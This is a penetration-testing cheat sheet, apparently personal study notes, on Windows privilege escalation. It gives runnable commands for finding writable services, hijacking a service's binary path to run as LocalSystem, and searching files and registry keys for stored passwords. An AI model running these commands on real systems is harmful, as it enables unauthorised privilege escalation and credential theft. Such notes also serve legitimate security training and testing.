# OS

Lots of time can be saved by running winPeas or a different script but below is how you can check stuff manualy and lots of stuff not done by the scripts

SAMBA? look under `445-smb` in the `Enumeration/port_enumeration` folder

Watson - https://github.com/rasta-mouse/Watson
WinPeas - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS


## LDAP - Perform Windows domain enumeration via LDAP
https://github.com/ZeroPointSecurity/Domain-Enumeration-Tool


## Writable Service Executables
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\services.txt
```
If wmic is not available:
```
sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```
Then use either accesschk.exe, cacls, or icacls to list the access permissions associated with each service executable:
```
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c accesschk.exe /accepteula -qv "%a" >> accesschk.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c cacls "%a" >> cacls.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c icacls "%a" >> icacls.txt
```
With accesschk results, look for the following permissions:

Permission	Use Case
SERVICE_ALL_ACCESS	Can do anything.
SERVICE_CHANGE_CONFIG	Can reconfigure the service binary.
WRITE DAC	Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG.
WRITE_OWNER	Can become owner, reconfigure permissions.
GENERIC_WRITE	Inherits SERVICE_CHANGE_CONFIG
GENERIC_ALL	Inherits SERVICE_CHANGE_CONFIG
With cacls and icacls, look for (F)ull Access, (M)odify access, (W)rite-only access, (WDAC) write DAC, or (WO) write owner.

## Writable Service Objects(priv esclatation)
Use accesschk.exe to find writable service objects:
```
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```
```
sc qc <service>
```
Update the service binary path:
```
sc config <service> binpath= "<command>"
```
Update the name of the account which a service runs as:
```
sc config upnphost obj= ".\LocalSystem" password= ""
```
Stop / Start a service:
```
wmic service <service> call stopservice
wmic service <service> call startservice

net stop <service>
net start <service>

sc stop <service>
sc start <service>
```
If the service fails to start because of a dependency, you can start the dependency manually, or remove the dependency:
```
sc config <service> depend= ""
```
All-in-one comnand:
```
sc config <service> binPath= "<command>" depend= "" start= demand obj= ".\LocalSystem" password= ""
```
## Cleartext Passwords
```
findstr /si password *.txt *.xml *.ini
```
```
dir /s *pass* == *cred* == *vnc* == *.config*
```
```
findstr /spin "password" *.*
```

Common files which contain passwords:
```
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```
Search for passwords in the registry:
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

# RDP
use xfreerdp!
```
sudo xfreerdp /v:10.129.56.77 /cert:ignore /u:Administrator
```
